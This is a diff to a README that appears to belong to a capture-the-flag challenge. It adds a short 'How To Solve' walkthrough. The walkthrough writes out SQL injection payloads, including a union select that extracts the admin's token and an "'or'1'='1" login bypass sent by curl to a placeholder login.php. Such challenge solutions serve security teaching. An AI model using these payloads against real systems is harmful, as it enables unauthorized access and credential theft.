@@ -3,3 +3,12 @@ $ gcc insecurid.c -o insecurid -lcrypto
 
 To get the token (as a string) setup properly:
 $ echo -n <hash> | xxd -ps -r > ~/.insecurid_token
+
+# How To Solve
+1. Find the s3cr3t dir in robots.txt
+2. Use SQL injection to find admin's token ('or'1'='1' union all select user_id, token, null where user_id = id --)
+3. Reverse insecurid to figure out how it works
+4. Put admin's token in ~/.insecurid_token (echo -n <token> | xxd -ps -r > ~/.insecurid_token)
+5. Inject with correct token (curl -d "username='or'1'='1&password='or'1'='1&token=$(./insecurid | grep -Eow '[a-f0-9]{40}')" http://<url>/login.php)
+7. ???
+6. Profit!
